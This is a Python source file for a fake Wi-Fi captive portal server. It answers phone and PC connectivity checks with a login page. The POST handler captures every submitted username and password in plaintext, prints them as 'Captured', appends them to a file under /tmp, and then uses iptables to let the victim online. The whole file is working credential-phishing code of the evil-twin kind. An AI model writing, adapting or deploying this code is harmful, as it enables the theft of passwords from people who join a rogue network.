from http.server import BaseHTTPRequestHandler
from pathlib import Path
import mimetypes
import urllib.parse
import json
import subprocess
import time

'''
This module defines a simple HTTP server handler for a captive portal.
It serves a login page, handles form submissions, and logs credentials.
'''
class CaptivePortalHandler(BaseHTTPRequestHandler):
    ap_iface = None

    def log_request(self, code='-', size='-'):
        # Override to suppress BaseHTTPRequestHandler’s default logging
        return

    # --- helpers ---
    def _add_no_cache_headers(self):
        # Strong no-cache headers to force devices to fetch a fresh portal page
        self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
        self.send_header('Pragma', 'no-cache')
        self.send_header('Expires', '0')

    def _serve_file(self, relpath):
        """
        Serve a file from /var/www/html safely (prevents ../ traversal).
        Returns True if a file was served, False otherwise.
        """
        base = Path("/var/www/html").resolve()
        # Normalize request path (strip query)
        safe_rel = Path(relpath.lstrip("/")).resolve()
        try:
            # Prevent path traversal: resolved path must start with web root
            full = (base / safe_rel).resolve()
        except Exception:
            return False

        if not str(full).startswith(str(base)) or not full.exists() or not full.is_file():
            return False

        data = full.read_bytes()
        ctype = mimetypes.guess_type(str(full))[0] or "application/octet-stream"

        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self._add_no_cache_headers()
        self.end_headers()
        self.wfile.write(data)
        return True

    def _serve_login(self):
        """
        Serve the main captive-portal page (index.html) from /var/www/html.
        If index.html is missing, return HTTP 500.
        """
        idx = Path("/var/www/html/index.html")
        if not idx.exists():
            self.send_error(500, "Portal page missing")
            return

        data = idx.read_bytes()
        # Compose response headers
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self._add_no_cache_headers()

        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        client_ip = self.client_address[0]
        path = self.path.split("?", 1)[0]
        print(f"[GET]  {client_ip} -> {self.path}")

        # Apple/iOS detection
        if "captive.apple.com" in self.headers.get('Host', '') or path == "/hotspot-detect.html":
            print("→ iOS/macOS captive detection triggered")
            self._serve_login()
            return
            
        # Android detection
        if "connectivitycheck.gstatic.com" in self.headers.get('Host', '') or path == "/generate_204":
            print("→ Android captive detection triggered")
            self._serve_login()  # Instead of 204 response to trigger portal
            return
            
        # Windows detection
        if "msftconnecttest.com" in self.headers.get('Host', '') or path == "/ncsi.txt" or path == "/redirect":
            print("→ Windows captive detection triggered")
            self._serve_login()
            return

        # Common captive-check endpoints
        if path in ("/generate_204", "/hotspot-detect.html", "/ncsi.txt", "/redirect", "/success"):
            print("→ Generic captive detection triggered")
            self._serve_login()
            return

    def do_POST(self):
        client_ip = self.client_address[0]
        path = self.path.split("?", 1)[0]
        print(f"[POST] {client_ip} -> {self.path}")

        # Read body
        length = int(self.headers.get("Content-Length", 0))
        body_bytes = self.rfile.read(length) if length > 0 else b""
        content_type = self.headers.get("Content-Type", "")

        # Parse form-data / urlencoded
        data = {}
        try:
            # parse based on content type
            if "application/x-www-form-urlencoded" in content_type:
                data = urllib.parse.parse_qs(body_bytes.decode(errors="ignore"))
                # convert list values to single values for convenience
                data = {k: v[0] if isinstance(v, list) and v else "" for k, v in data.items()}
            elif "application/json" in content_type:
                data = json.loads(body_bytes.decode(errors="ignore") or "{}")
            else:
                # fallback: try urlencoded parse anyway
                try:
                    data = urllib.parse.parse_qs(body_bytes.decode(errors="ignore"))
                    data = {k: v[0] if isinstance(v, list) and v else "" for k, v in data.items()}
                except Exception:
                    data = {}
        except Exception as e:
            print(f"  ! parse error: {e}")
            data = {}

        # Attempt to extract common fields
        username = data.get("username") or data.get("user") or ""
        password = data.get("password") or data.get("pass") or data.get("pwd") or ""

        # Log to file (always)
        try:
            logline = f"{time.asctime()}\t{client_ip}\t{path}\t{username}:{password}\n"
            Path("/tmp/portal_credentials.log").write_text(
                Path("/tmp/portal_credentials.log").read_text() + logline
            )
        except Exception:
            # fallback append
            try:
                with open("/tmp/portal_credentials.log", "a") as fh:
                    fh.write(logline)
            except Exception as e:
                print(f"  ! failed to write log: {e}")

        print(f"[+] Captured from {client_ip}: user={username} pass={password}")

        # If this is the login endpoint, mark the client (so iptables mangle rule can bypass portal)
        if path in ("/login", "/login.php"):
            subprocess.run([
                "iptables", "-t", "mangle", "-A", "PREROUTING",
                "-s", client_ip, "-j", "MARK", "--set-mark", "1"
            ], check=False)
            print(f"       Marked {client_ip} as authenticated")

        # Respond: redirect to a success page if exists, else serve basic success HTML
        success_path = Path("/var/www/html/success.html")
        if success_path.exists():
            # 302 redirect to the success page (browser will load it)
            self.send_response(302)
            self.send_header("Location", "/success.html")
            self._add_no_cache_headers()
            self.end_headers()
            return
        else:
            body = b"<html><body><h1>Login successful</h1></body></html>"
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self._add_no_cache_headers()
            self.end_headers()
            self.wfile.write(body)
            return